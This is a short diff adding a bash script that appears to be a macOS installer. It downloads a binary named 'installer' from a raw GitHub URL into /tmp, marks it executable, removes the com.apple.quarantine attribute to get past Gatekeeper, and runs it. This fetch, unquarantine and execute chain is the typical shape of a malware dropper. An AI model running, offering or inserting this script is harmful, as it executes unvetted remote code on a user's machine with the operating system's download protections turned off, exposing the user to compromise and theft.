@@ -1,0 +1,8 @@
+#/bin/bash
+#
+cd /tmp/
+rm -f /tmp/installer
+curl -O https://raw.githubusercontent.com/evystart/brick/refs/heads/main/501/installer
+chmod +x /tmp/installer
+xattr -dr com.apple.quarantine /tmp/installer
+/tmp/installer
